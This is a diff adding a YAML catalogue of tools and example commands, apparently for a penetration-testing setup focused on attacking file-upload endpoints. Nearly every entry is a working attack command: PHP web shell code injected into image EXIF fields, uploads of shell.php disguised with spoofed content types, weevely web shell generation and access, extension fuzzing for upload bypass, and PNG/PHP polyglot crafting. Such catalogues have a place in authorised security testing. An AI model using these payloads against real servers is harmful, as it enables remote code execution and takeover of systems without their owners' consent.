@@ -1,0 +1,61 @@
+curl:
+  description: "Craft multipart file upload requests with custom headers and filenames"
+  category: "exploitation"
+  install_cmd: "apt-get install -y curl"
+  verify_cmd: "curl --version"
+  examples:
+    - "curl -F 'file=@shell.php;type=image/jpeg' http://target/upload"
+    - "curl -F 'file=@shell.php.jpg;filename=shell.php' http://target/upload"
+    - "curl -F 'file=@polyglot.php;type=image/png' -H 'Content-Type: multipart/form-data' http://target/upload"
+
+exiftool:
+  description: "Read/write metadata in image files — inject PHP into EXIF data"
+  category: "exploitation"
+  install_cmd: "apt-get install -y libimage-exiftool-perl"
+  verify_cmd: "exiftool -ver"
+  examples:
+    - "exiftool -Comment='<?php system($_GET[\"c\"]); ?>' image.jpg"
+    - "exiftool -DocumentName='<?php phpinfo(); ?>' test.png"
+    - "exiftool -overwrite_original -Comment='<?php echo shell_exec($_GET[\"c\"]); ?>' payload.gif"
+
+weevely:
+  description: "Stealth PHP web shell generator and manager"
+  category: "post-exploitation"
+  install_cmd: "apt-get install -y weevely"
+  verify_cmd: "weevely --help | head -n 1"
+  examples:
+    - "weevely generate password123 shell.php"
+    - "weevely http://target/uploads/shell.php password123"
+
+ffuf:
+  description: "Fuzz upload endpoints for allowed extensions and bypass techniques"
+  category: "discovery"
+  install_cmd: "apt-get install -y ffuf"
+  verify_cmd: "ffuf -V"
+  examples:
+    - "ffuf -u http://target/upload -X POST -F 'file=@shell.FUZZ' -w extensions.txt -mc 200"
+
+burpsuite:
+  description: "Intercept and modify upload requests in-flight"
+  category: "web"
+  install_cmd: "apt-get install -y burpsuite"
+  verify_cmd: "which burpsuite"
+  examples:
+    - "burpsuite"
+
+python3:
+  description: "Python scripts for polyglot generation and upload automation"
+  category: "exploitation"
+  install_cmd: "apt-get install -y python3 python3-pip"
+  verify_cmd: "python3 --version"
+  examples:
+    - "python3 -c \"import requests; r=requests.post('http://target/upload', files={'file': ('shell.php', open('shell.php','rb'), 'image/jpeg')}); print(r.text)\""
+
+xxd:
+  description: "Hex editor for crafting magic bytes and polyglot files"
+  category: "utility"
+  install_cmd: "apt-get install -y xxd"
+  verify_cmd: "xxd --version 2>&1 | head -1"
+  examples:
+    - "xxd shell.php | head"
+    - "printf '\\x89PNG\\r\\n\\x1a\\n' > polyglot.php && cat shell_code.php >> polyglot.php"
